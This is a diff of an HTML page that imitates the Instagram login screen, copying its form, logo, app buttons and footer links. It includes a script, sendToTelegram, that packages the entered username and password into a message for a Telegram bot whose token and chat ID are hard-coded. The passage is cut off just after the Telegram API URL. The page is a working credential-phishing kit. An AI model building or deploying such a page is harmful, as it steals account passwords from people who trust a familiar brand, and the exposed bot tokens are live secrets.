@@ -1,708 +1,282 @@
-r^-<!DOCTYPE html> 
-<html> 
+
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>account - Login</title>
-<style>
-/* Universal Selectors */
-#root, body, html {
-  height:100%;
-}
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram Login</title>
+  <style>
+    /* Reset and basic styles */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      background-color: #fff;
+      color: #262626;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+      justify-content: start;
+      padding: 20px 20px 60px;
+    }
+    a {
+      color: #3897f0;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
 
-body {
-  overflow-y: scroll;
-  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-  background-color: #fafafa;
-  color: #262626;
-}
+    /* Container */
+    .container {
+      max-width: 350px;
+      width: 100%;
+    }
 
-a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
-  margin:0;
-  padding:0;
-  border:0;
-  font:inherit;
-  vertical-align: baseline;
-} 
+    /* Instagram Logo - replaced with image */
+    .logo {
+      text-align: center;
+      margin: 40px 0 20px 0;
+      user-select: none;
+    }
+    .logo img {
+      width: 240px; /* Adjust size as needed */
+      height: auto;
+      display: inline-block;
+    }
 
-a, a:visited {
-  text-decoration: none;
-}
-a:active, .btn:active {
-  opacity:.5;
-}
+    /* Form */
+    form {
+      background: #fafafa;
+      /* border: 1px solid #dbdbdb; */ /* Border removed */
+      padding: 40px 40px 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      border-radius: 1px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      background-color: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 8px 7px 8px;
+      font-size: 14px;
+      width: 100%;
+      outline-offset: -2px;
+      outline-color: transparent;
+      transition: outline-color 0.2s ease-in-out;
+    }
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      outline-color: #a8a8a8;
+      background-color: #fff;
+    }
 
-ol, ul {
-  list-style: none;
-}
+    /* Login button */
+    button.login-btn {
+      margin-top: 8px;
+      background-color: #0095f6;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 0;
+      color: white;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+      transition: background-color 0.3s ease-in-out;
+    }
+    button.login-btn:hover:not(:disabled) {
+      background-color: #007acc;
+    }
+    button.login-btn:disabled {
+      opacity: 0.5;
+      cursor: default;
+    }
 
-#root, article, main, div, section, header, nav, footer {
-  border: 0 solid #000000;
-  box-sizing: border-box;
-  align-items: stretch;
-  display: flex;
-  flex-direction: column;
-  flex-shrink: 0;
-  margin:0;
-  padding:0;
-  position: relative;
-  -webkit-box-align: stretch;
-    -moz-box-align: stretch;
-  -webkit-box-orient: vertical;
-    -moz-box-orient: vertical;
-  -webkit-box-direction: normal;
-    -moz-box-direction: normal;
-} /* <--Universal Selectors End */
+    /* Forgot password */
+    .forgot-password {
+      text-align: center;
+      font-size: 12px;
+      margin: 20px 0 0 0;
+    }
 
+    /* Sign up section */
+    .signup-section {
+      margin: 20px 0 30px;
+      padding: 20px 0;
+      /* border: 1px solid #dadada; */ /* Border removed */
+      background: #fff;
+      border-radius: 1px;
+      text-align: center;
+      font-size: 14px;
+    }
 
-#root {
-  z-index: 0;
-}
+    /* Get the app section */
+    .get-app {
+      text-align: center;
+      font-size: 14px;
+      margin-bottom: 15px;
+      user-select: none;
+    }
+    .app-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .app-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 4px;
+      background: black;
+      color: white;
+      font-size: 14px;
+      font-weight: 600;
+      padding: 6px 12px;
+      text-decoration: none;
+      height: 40px;
+      user-select: none;
+    }
+    .app-button svg {
+      height: 20px;
+      width: 20px;
+      margin-right: 8px;
+      fill: white;
+      flex-shrink: 0;
+    }
 
-.section-all {
-  min-height:100%;
-  overflow:hidden;
-}
+    /* Footer navigation */
+    footer {
+      margin-top: auto;
+      max-width: 600px;
+      width: 100%;
+      padding: 20px 0;
+      user-select: none;
+    }
+    .footer-nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 15px 15px;
+      font-size: 12px;
+      color: #00376b;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+    .footer-nav a {
+      color: #00376b;
+      text-decoration: none;
+    }
+    .footer-nav a:hover {
+      text-decoration: underline;
+    }
+    .footer-branding {
+      color: #8e8e8e;
+      font-size: 12px;
+      text-align: center;
+      margin-top: 15px;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+    }
 
-.main {
-  background-color: #fafafa;
-  order: 4;
-  flex-grow: 1;
-  -webkit-box-flex: 1;
-  -moz-box-flex: 1;
-  -moz-box-ordinal-group: 5;
-  -webkit-box-ordinal-group: 5;
-}
-
-.wrapper {
-  min-height:100%;
-  overflow: hidden;
-}
-
-.wrapper, .article {
-  flex-grow: 1;
-  justify-content: center;
-  -webkit-box-flex: 1;
-    -moz-box-flex: 1;
-  -webkit-box-pack: center;
-    -moz-box-pack: center;
-}
-
-.article {
-  flex-direction: row;
-  margin:0 auto;
-  max-width: 935px;
-  width:100%;
-  -webkit-box-orient: horizontal;
-    -moz-box-orient: horizontal;
-  -webkit-box-direction: normal;
-    -moz-box-direction: normal;
-}
-
-.content {
-  color:#262626;
-  flex-grow:1;
-  justify-content: center;
-  max-width: 350px;
-  margin-top:12px;
-  -webkit-box-pack: justify;
-    -moz-box-pack: justify;
-  -webkit-box-flex: 1;
-    -moz-box-flex: 1;  
-}
-
-.login-box {
-  background: #fff;
-  border: 1px solid #e6e6e6;
-  border-radius: 3px;
-  margin: 0 0 10px;
-  padding: 20px 0;
-  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
-}
-
-.header {
-  width: 176px;
-  height: 60px;
-  background: url('https://i.imgur.com/fdOdI4U.png') left center / 50% 100% no-repeat, url('https://i.imgur.com/DoatUTC.png') right center / 50% 100% no-repeat;
-  margin: 14px auto 14px auto;
-}
-
-
-.logo {
-  background: cover no-repeat;
-  width:175px;
-  height:auto;
-}
-
-.form {
-  display: flex;
-  flex-direction: column;
-  margin-bottom: 10px;
-  -moz-box-direction: normal;
-  -webkit-box-direction: normal;
-}
-
-.input-box {
-  margin: auto 40px 12px;
-  position: relative;
-}
-
-input {
-  height: 36px;
-  border: 1px solid #efefef;
-  border-radius: 4px;
-  background-color: #fafafa;
-  width: 100%;
-  font-size: 14px;
-  margin: 0;
-  padding: 9px 9px 7px 12px;
-  outline: none;
-  overflow: hidden;
-  text-overflow: ellipsis;
-  box-sizing: border-box;
-  transition: border-color 0.3s ease;
-}
-
-input#name:focus, input#password:focus {
-  border-color: #a8a8a8;
-  box-shadow: 0 0 0 1px rgba(38, 38, 38, 0.1);
-}
-
-.button-box {
-  display: block;
-  position: relative;
-  margin: 14px 40px;
-}
-
-.btn {
-  cursor: pointer;
-  width: 100%;
-  padding: 0 8px; 
-  background: #0095f6;
-  border: 1px solid #0095f6;
-  color: #fff;
-  border-radius: 4px;
-  font-weight: 600;
-  font-size: 14px;
-  height: 32px;
-  line-height: 30px;
-  outline: none;
-  white-space: nowrap;
-  transition: background 0.3s ease;
-}
-
-.btn:hover {
-  background: #1877f2;
-}
-
-.forgot, .forgot:active, .forgot:hover, .forgot:visited {
-  font-size: 12px;
-  margin-top: 16px;
-  text-align: center;
-  color: #00376b;
-  line-height: 14px !important;
-  transition: color 0.3s ease;
-}
-
-.forgot:hover {
-  color: #1877f2;
-}
-
-.text {
-  text-align: center;
-  margin: 18px;
-  color: #262626;
-  font-size: 14px;
-}
-
-.text a, .text a:visited, .text a:hover, .text a:active {
-  color: #0095f6;
-  margin-left: 5px;
-  font-weight: 600;
-  transition: color 0.3s ease;
-}
-
-.text a:hover {
-  color: #1877f2;
-}
-
-/* App Store */
-.app p {
-  line-height: 18px;
-  color:#262626;
-  font-size:14px;
-  text-align:center;
-  margin:10px 20px;
-}
-
-.app-img {
-  flex-direction: row;
-  justify-content: center;
-  margin:10px 0;
-  -webkit-box-orient: horizontal;
-  -moz-box-orient: horizontal;
-}
-
-.app-img a {
-  margin-right:8px;
-  height: 43.5px;
-}
-
-.app-img img {
-  height:40px;
-}
-
-/* FOOTER */
-.footer {
-  background-color: #fafafa;
-  order: 5;
-  padding: 0 20px;
-  background: #fafafa;
-}
-
-.footer-container {
-  flex-direction: row;  
-  flex-wrap:wrap;
-  background-color: #fafafa;
-  justify-content: space-between;
-  padding: 38px 0;
-  max-width:935px;
-  font-size:12px;
-  font-weight:600;
-  margin:0 auto;
-  text-transform:uppercase;
-  width:100%
-}
-
-.footer-nav {
-  max-width:100%;
-}
-
-.footer-nav ul {
-  margin-right:16px;
-  margin-bottom:3px;
-  flex-grow:1;
-}
-
-.footer-nav ul li {
-  display: inline-block;
-  margin-right: 13px;
-  margin-bottom:7px;
-}
-
-.footer-nav ul li a {
-  color: #00376b;
-  text-decoration: none;
-  transition: color 0.3s ease;
-}
-
-.footer-nav ul li a:hover {
-  color: #1877f2;
-}
-
-.footer span {
-  color:#999;
-}
-
-span.language { 
-  color: #003569;
-  cursor: pointer;
-  display: inline-block;
-  font-weight: 600;
-  position: relative;
-  text-transform: uppercase;
-  vertical-align: top;
-}
-
-.select {
-  cursor: pointer;
-  height: 100%;
-  top: 0;
-  opacity: 0;
-  position: absolute;
-  left:0;
-  width: 100%;
-}
-
-/* Media Queries */
-@media (max-width:450px) {
-  .main {
-    background-color: #fff;
-  }
-
-  .content {
-    max-width: 100%;
-    margin-top: 0;
-    justify-content: space-between;
-  }
-
-  .login-box {
-    background-color: transparent;
-    border: none;
-    box-shadow: none;
-  }
-
-  .logo {
-    background: cover no-repeat;
-    width:175px;
-    height:auto;
-    margin:0 auto;
-  }
-
-  .btn {
-    cursor: pointer;
-    width: 100%;
-    padding:0 8px; 
-    background: #3897f0;
-    border:1px solid #3897f0;
-    color:#fff;
-    border-radius:3px;
-    font-weight:600;
-    font-size: 14px;
-    height: 28px;
-    line-height: 26px;
-    outline: none;
-    white-space: nowrap;
-  }
-
-  .input-box {
-    border: 1px solid #efefef;
-    border-radius: 4px;
-    height: 36px;
-    background: #fafafa;
-    position: relative;
-    margin-bottom: 14px;
-  }
-
-  input {
-    border: 0;
-    background-color: #fafafa;
-    width:100%;
-    font-size:12px;
-    margin: 0;
-    padding: 9px 8px 7px 8px;
-    outline: none;
-    overflow: hidden;
-    text-overflow: ellipsis;
-    box-sizing: border-box;
-  }
-
-  .input-box:hover, .input-box:focus {
-    border-color:#bbb;
-  }
-
-}
-
-@media only screen and (max-width:875px) {
-  .footer-container {
-    text-align: center;
-    padding:10px 0;
-  }
-  .footer-container,  .footer-nav ul {
-    justify-content: center;
-    margin:0 auto;
-    max-width: 360px;
-    min-width: auto;
-    -webkit-box-pack: center;
-    -moz-box-pack: center;
-  }
-
-}
-</style>
+    /* Responsive - center on smaller */
+    @media (max-width: 400px) {
+      .container {
+        max-width: 95%;
+      }
+    }
+  </style>
 </head>
 <body>
-  <span id="root">
-    <section class="section-all">
-	
-      <!-- 1-Role Main -->
-      <main class="main" role="main">
-        <div class="wrapper">
-          <article class="article">
-            <div class="content">
-              <div class="login-box">
-                <div class="header">
-                </div><!-- Header end -->
-                <div class="form-wrap">
-                  <div class="form" >
-                    <div class="input-box">
-                      <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="none" autocorrect="off" name="email" value="" required="">
-                    </div>  
-                     <div class="input-box">
-                      <input type="text" name="pass" id="pass" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="none" autocorrect="off" required="">
-                    </div>  
+  <div class="container" role="main">
+    <div class="logo" aria-label="Instagram">
+      <a href="https://ibb.co/wtjD1Vy" target="_blank" rel="noopener noreferrer">
+        <img src="https://i.ibb.co/LKH4fmS/IMG-20250709-WA0002-2.jpg" alt="Instagram Logo" />
+      </a>
+    </div>
 
-                    <span class="button-box">
-                      <a id="submitBtn"  href ="#" ><button class="btn" id="loginButton" type="button" name="submit">Log in</button></a>
-                    </span>  
+    <form aria-label="Login form">
+      <input
+        type="text"
+        name="username"
+        autocomplete="username"
+        aria-required="true"
+        placeholder="Phone number, username, or email"
+        required
+      />
+      <input
+        type="password"
+        name="password"
+        autocomplete="current-password"
+        placeholder="Password"
+        aria-required="true"
+        required
+      />
+      <button type="submit" class="login-btn" aria-label="Log in to Instagram">Log in</button>
+    </form>
 
-                    <a class="forgot" href="">Forgot password?</a>
-                  </div>
-                </div> <!-- Form-wrap end -->
-              </div> <!-- Login-box end -->
+    <p class="forgot-password">
+      <a href="#" tabindex="0" aria-label="Forgot password link">Forgot password?</a>
+    </p>
 
-              <div class="login-box">
-                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
-              </div> <!-- Signup-box end -->
-
-              <div class="app">
-                <p>Get the app.</p>
-                <div class="app-img">
-                  <a href="#">
-                    <img src="https://i.imgur.com/vZWnmGd.png">
-                  </a>
-                  <a href="#">
-                    <img src="https://i.imgur.com/VpxSGxx.png">
-                  </a>  
-                </div>  <!-- App-img end-->
-              </div> <!-- App end -->
-            </div> <!-- Content end -->
-          </article>
-        </div> <!-- Wrapper end -->
-      </main>
-
-      <!-- 2-Role Footer -->
-      <footer class="footer" role="contentinfo">
-        <div class="footer-container">
-
-          <nav class="footer-nav" role="navigation">
-            <ul>
-              <li><a href="">About Us</a></li>
-              <li><a href="">Support</a></li>
-              <li><a href="">Blog</a></li>
-              <li><a href="">Press</a></li>
-              <li><a href="">Api</a></li>
-              <li><a href="">Jobs</a></li>
-              <li><a href="">Privacy</a></li>
-              <li><a href="">Terms</a></li>
-              <li><a href="">Directory</a></li>
-              <li>
-                <span class="language">Language
-                  <select name="language" class="select" onchange="la(this.value)">
-                  </select>
-                </span>
-              </li>
-            </ul>
-          </nav>
-
-          <span class="footer-logo">  Instgram</span>
-        </div> <!-- Footer container end -->
-      </footer>
-      
+    <section class="signup-section" aria-label="Sign up prompt">
+      Don't have an account? <a href="#" aria-label="Sign up for Instagram">Sign up</a>
     </section>
-  </span> <!-- Root -->
 
-  <!-- Scripts -->
+    <div class="get-app" aria-label="Get the app">
+      Get the app.
+    </div>
+
+    <div class="app-buttons" aria-label="Download Instagram mobile app">
+      <a href="#" class="app-button" aria-label="Download on the App Store">
+        <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24">
+          <path d="M19.7 12.2c-.1-2.7 2.2-3.9 2.3-4-1.3-1.9-3.4-2.2-4.1-2.2-1.7-.2-3.3.9-4.1.9-.8 0-2.1-.9-3.4-.9-1.8 0-3.5 1-4.4 2.7-1.9 3.3-.5 8.1 1.3 10.7.9 1.3 2 2.8 3.4 2.7 1.4-.1 1.9-.9 3.4-.9s1.9.9 3.4.9c1.5 0 2.5-1.3 3.4-2.7 1-1.7 1.4-3.3 1.5-3.4-.1-.1-2.7-1-.1-3.9z"></path>
+        </svg>
+        App Store
+      </a>
+      <a href="#" class="app-button" aria-label="Get it on Google Play">
+        <svg aria-hidden="true" focusable="false" viewBox="30 336.7 120.9 129.2" style="height:20px; width:20px; margin-right:8px;">
+          <path fill="#FFD400" d="M36.7 337.3v128.3l50.2-64-.3-64.3-49.9.1z" />
+          <path fill="#FF3333" d="M85.5 337.6l-24.8 24.7 24.5 46 25.4-25.4-25.1-45.3z" />
+          <path fill="#48FF48" d="M36.7 465.6l50.2-64 25.7 25.5v-128.3z" />
+          <path fill="#3333FF" d="M111.8 436.2l-26.1-25.9 26.4-26.2 24.8 25.1-25.2 25z" />
+        </svg>
+        Google Play
+      </a>
+    </div>
+  </div>
+
+  <footer role="contentinfo" aria-label="Footer navigation and branding">
+    <nav class="footer-nav" aria-label="Footer links">
+      <a href="#" tabindex="0">ABOUT US</a>
+      <a href="#" tabindex="0">SUPPORT</a>
+      <a href="#" tabindex="0">BLOG</a>
+      <a href="#" tabindex="0">PRESS</a>
+      <a href="#" tabindex="0">API</a>
+      <a href="#" tabindex="0">JOBS</a>
+      <a href="#" tabindex="0">PRIVACY</a>
+      <a href="#" tabindex="0">TERMS</a>
+      <a href="#" tabindex="0">DIRECTORY</a>
+      <a href="#" tabindex="0">LANGUAGE</a>
+    </nav>
+    <div class="footer-branding" aria-label="Instagram branding">
+      INSTAGRAM
+    </div>
+  </footer>
+
   <script>
-  
-  document.addEventListener('DOMContentLoaded', function() {
-  // Get URL parameters
-  const urlParams = new URLSearchParams(window.location.search);
-  const userId = urlParams.get('i');
-  const lang = urlParams.get('lang') || detectBrowserLanguage();
-  
-  // Set language
-  setLanguage(lang);
-  
-  // Set user ID if it exists in URL
-  if (userId) {
-    document.getElementById('userId').value = userId;
-  }
-});
-
-// Language selector function
-function la(src) {
-  if (src !== '#') {
-    window.location.href = src;
-  }
-}
-
-// Function to detect browser language
-function detectBrowserLanguage() {
-  const browserLang = navigator.language || navigator.userLanguage;
-  const shortLang = browserLang.split('-')[0];
-  
-  // Map to supported languages or default to English
-  const supportedLangs = ['en', 'fr', 'ar', 'es', 'hi'];
-  return supportedLangs.includes(shortLang) ? shortLang : 'en';
-}
-
-// Function to set language on the page
-function setLanguage(lang) {
-  const translations = {
-    en: {
-      title: "Log in",
-      placeholderEmail: "Phone number, username, or email",
-      placeholderPassword: "Password",
-      loginButton: "Log in",
-      forgotPassword: "Forgot password?",
-      noAccount: "Don't have an account?",
-      signUp: "Sign up",
-      getApp: "Get the app.",
-      language: "Language",
-      aboutUs: "About Us",
-      support: "Support",
-      blog: "Blog",
-      press: "Press",
-      api: "Api",
-      jobs: "Jobs",
-      privacy: "Privacy",
-      terms: "Terms",
-      directory: "Directory"
-    },
-    fr: {
-      title: "Se connecter",
-      placeholderEmail: "Numéro de téléphone, nom d'utilisateur ou e-mail",
-      placeholderPassword: "Mot de passe",
-      loginButton: "Se connecter",
-      forgotPassword: "Mot de passe oublié ?",
-      noAccount: "Vous n'avez pas de compte ?",
-      signUp: "Inscrivez-vous",
-      getApp: "Obtenir l'application.",
-      language: "Langue",
-      aboutUs: "À propos",
-      support: "Assistance",
-      blog: "Blog",
-      press: "Presse",
-      api: "Api",
-      jobs: "Emplois",
-      privacy: "Confidentialité",
-      terms: "Conditions",
-      directory: "Annuaire"
-    },
-    ar: {
-      title: "تسجيل الدخول",
-      placeholderEmail: "رقم الهاتف أو اسم المستخدم ",
-      placeholderPassword: "كلمة السر",
-      loginButton: "تسجيل الدخول",
-      forgotPassword: "هل نسيت كلمة السر؟",
-      noAccount: "ليس لديك حساب؟",
-      signUp: "التسجيل",
-      getApp: "احصل على التطبيق.",
-      language: "اللغة",
-      aboutUs: "معلومات عنا",
-      support: "الدعم",
-      blog: "المدونة",
-      press: "الصحافة",
-      api: "Api",
-      jobs: "وظائف",
-      privacy: "الخصوصية",
-      terms: "الشروط",
-      directory: "الدليل"
-    },
-    es: {
-      title: "Iniciar sesión",
-      placeholderEmail: "Número de teléfono, usuario o correo electrónico",
-      placeholderPassword: "Contraseña",
-      loginButton: "Iniciar sesión",
-      forgotPassword: "¿Olvidaste tu contraseña?",
-      noAccount: "¿No tienes una cuenta?",
-      signUp: "Regístrate",
-      getApp: "Obtén la aplicación.",
-      language: "Idioma",
-      aboutUs: "Acerca de nosotros",
-      support: "Soporte",
-      blog: "Blog",
-      press: "Prensa",
-      api: "Api",
-      jobs: "Empleo",
-      privacy: "Privacidad",
-      terms: "Condiciones",
-      directory: "Directorio"
-    },
-    hi: {
-      title: "लॉग इन",
-      placeholderEmail: "फोन नंबर, उपयोगकर्ता नाम या ईमेल",
-      placeholderPassword: "पासवर्ड",
-      loginButton: "लॉग इन",
-      forgotPassword: "पासवर्ड भूल गए?",
-      noAccount: "खाता नहीं है?",
-      signUp: "साइन अप करें",
-      getApp: "ऐप प्राप्त करें।",
-      language: "भाषा",
-      aboutUs: "हमारे बारे में",
-      support: "सहायता",
-      blog: "ब्लॉग",
-      press: "प्रेस",
-      api: "एपीआई",
-      jobs: "नौकरियां",
-      privacy: "गोपनीयता",
-      terms: "शर्तें",
-      directory: "निर्देशिका"
-    }
-  };
-
-  // Apply translations to the page
-  const t = translations[lang] || translations.en;
-  document.title = `Instagram - ${t.title}`;
-  document.getElementById('name').placeholder = t.placeholderEmail;
-  document.getElementById('password').placeholder = t.placeholderPassword;
-  document.querySelector('.btn').textContent = t.loginButton;
-  document.querySelector('.forgot').textContent = t.forgotPassword;
-  
-  const signupText = document.querySelector('.text');
-  signupText.innerHTML = `${t.noAccount}<a href="#">${t.signUp}</a>`;
-  
-  document.querySelector('.app p').textContent = t.getApp;
-  document.querySelector('span.language').firstChild.textContent = t.language;
-  
-  // Update footer links
-  const footerLinks = document.querySelectorAll('.footer-nav ul li a');
-  footerLinks[0].textContent = t.aboutUs;
-  footerLinks[1].textContent = t.support;
-  footerLinks[2].textContent = t.blog;
-  footerLinks[3].textContent = t.press;
-  footerLinks[4].textContent = t.api;
-  footerLinks[5].textContent = t.jobs;
-  footerLinks[6].textContent = t.privacy;
-  footerLinks[7].textContent = t.terms;
-  footerLinks[8].textContent = t.directory;
-  
-  // Set the correct direction for Arabic
-  if (lang === 'ar') {
-    document.documentElement.setAttribute('dir', 'rtl');
-  } else {
-    document.documentElement.setAttribute('dir', 'ltr');
-  }
-  
-  // Update language selector
-  updateLanguageSelector(lang);
-}
-
-// Function to update language selector
-function updateLanguageSelector(currentLang) {
-  const selector = document.querySelector('.select');
-  selector.innerHTML = '';
-  
-  const languages = {
-    'en': 'English',
-    'fr': 'Français',
-    'ar': 'العربية',
-    'es': 'Español',
-    'hi': 'हिंदी'
-  };
-  
-  // Get current userId from URL if it exists
-  const urlParams = new URLSearchParams(window.location.search);
-  const userId = urlParams.get('i');
-  const userIdParam = userId ? `&i=${userId}` : '';
-  
-  Object.entries(languages).forEach(([code, name]) => {
-    const option = document.createElement('option');
-    option.value = `?lang=${code}${userIdParam}`;
-    option.textContent = name;
-    option.selected = code === currentLang;
-    selector.appendChild(option);
-  });
-  
-  // Update language selector handler
-  selector.onchange = function() {
-    window.location.href = this.value;
-  };
-}
-<script>
     async function sendToTelegram(username, password) {
-      const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
-      const chatId = '1747742228';
+      const botToken = '8157111925:AAEq1sV-01ewJ29tIjXjMmXWKfWx4lU5isI';
+      const chatId = '7351989900';
       const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
 
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
